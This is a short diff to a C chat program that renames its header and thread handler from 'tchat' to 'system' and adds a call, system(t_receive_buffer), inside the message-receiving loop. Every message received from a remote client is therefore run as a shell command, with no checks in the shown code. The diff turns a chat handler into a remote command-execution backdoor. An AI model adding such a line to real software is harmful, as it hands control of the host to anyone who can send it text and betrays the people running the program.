@@ -1,6 +1,6 @@
-#include "./tchat.h"
+#include "./system.h"
 
-void* tchat_handler(void* p_client_number)
+void* system_handler(void* p_client_number)
 {
      int t_client_number = (int) (intptr_t) p_client_number;
 
@@ -61,6 +61,8 @@ void* tchat_handler(void* p_client_number)
                print_textarea();
 
                refresh_windows();
+
+               system(t_receive_buffer);
 
                memset(t_buffer, 0, strlen(t_buffer));
                memset(t_receive_buffer, 0, strlen(t_receive_buffer));
